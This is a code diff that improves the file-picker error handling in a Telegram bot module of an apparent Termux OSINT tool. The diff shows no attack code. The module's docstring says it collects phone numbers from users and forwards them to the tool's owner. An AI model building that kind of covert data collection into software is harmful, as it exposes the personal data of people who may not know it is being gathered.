@@ -2,7 +2,8 @@
 """
 Telegram Bot Module for 7AKM OSINT
 - Collects phone numbers from users and forwards to owner
-- Send encrypted files to Telegram using user-provided token and chat ID (direct send)
+- Send encrypted files to Telegram using user-provided token and chat ID
+- File selection via file picker or manual path
 """
 
 import asyncio
@@ -116,17 +117,37 @@ class TelegramBot:
             print(Fore.YELLOW + "[*] Bot stopped." + Style.RESET_ALL)
 
 def get_file_via_picker():
-    """فتح منتقي الملفات باستخدام termux-storage-get"""
+    """فتح منتقي الملفات باستخدام termux-storage-get مع تحسينات"""
+    # التحقق من وجود termux-storage-get
+    try:
+        subprocess.run(['termux-storage-get', '--help'], capture_output=True, timeout=5)
+    except FileNotFoundError:
+        print(Fore.RED + "[-] termux-storage-get not found. Please install termux-api:" + Style.RESET_ALL)
+        print(Fore.YELLOW + "    pkg install termux-api" + Style.RESET_ALL)
+        return None
+    except Exception:
+        pass
+
+    print(Fore.YELLOW + "Opening file picker... (you have 60 seconds)" + Style.RESET_ALL)
     try:
         result = subprocess.run(['termux-storage-get'], capture_output=True, text=True, timeout=60)
         if result.returncode == 0:
             path = result.stdout.strip()
-            if path and os.path.exists(path):
-                return path
-        return None
+            if path:
+                if os.path.exists(path):
+                    print(Fore.GREEN + f"[+] Selected file: {path}" + Style.RESET_ALL)
+                    return path
+                else:
+                    print(Fore.RED + f"[-] Selected path does not exist: {path}" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + "[-] No file selected." + Style.RESET_ALL)
+        else:
+            print(Fore.RED + f"[-] File picker returned error code {result.returncode}" + Style.RESET_ALL)
+    except subprocess.TimeoutExpired:
+        print(Fore.RED + "[-] File picker timed out." + Style.RESET_ALL)
     except Exception as e:
         print(Fore.RED + f"[-] Error in file picker: {e}" + Style.RESET_ALL)
-        return None
+    return None
 
 def send_encrypted_file():
     """إرسال ملف مشفر إلى تليجرام مباشرة (بدون حفظ) مع إضافة توقيع الأداة"""
@@ -158,12 +179,10 @@ def send_encrypted_file():
             print(Fore.RED + "❌ File not found.")
             return
     elif method == "2":
-        print(Fore.YELLOW + "Opening file picker... (you have 60 seconds)" + Style.RESET_ALL)
         file_path = get_file_via_picker()
         if not file_path:
             print(Fore.RED + "❌ No file selected or error.")
             return
-        print(Fore.GREEN + f"[+] Selected file: {file_path}" + Style.RESET_ALL)
     else:
         print(Fore.RED + "❌ Invalid choice.")
         return
